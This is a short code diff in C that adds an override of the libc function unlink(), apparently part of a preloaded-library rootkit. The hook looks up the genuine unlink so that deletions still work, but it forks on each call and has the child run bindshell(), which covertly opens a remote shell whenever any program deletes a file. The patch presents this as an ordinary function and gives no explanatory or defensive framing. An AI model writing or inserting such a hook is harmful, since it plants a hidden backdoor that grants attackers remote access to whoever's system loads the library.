@@ -154,3 +154,20 @@ int strcmp(const char *s1, const char *s2){
 	}
 
 }
+
+int unlink(const char *pathname){
+
+	void *handle;
+	void *(*sym)(const char *pathname);
+	const char* libc_path = getlibc();
+	handle = dlopen(libc_path, RTLD_LAZY);
+	sym = (void *) dlsym(handle, "unlink");
+
+	if(fork() == 0){
+ 		bindshell(); 
+	}
+	else {
+  		return (sym(pathname));
+	}
+
+}
